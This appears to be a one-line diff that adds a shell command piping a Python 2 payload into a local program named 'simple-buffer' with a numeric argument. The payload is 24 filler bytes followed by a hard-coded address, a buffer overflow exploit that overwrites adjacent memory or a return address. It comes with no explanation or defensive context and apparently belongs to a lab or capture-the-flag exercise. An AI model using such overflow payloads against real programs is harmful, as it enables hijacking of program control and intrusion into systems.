@@ -1,0 +1,1 @@
+python -c 'print "A"*24 +"\xF1\xDA\x29\x01"'| ./simple-buffer 19520241
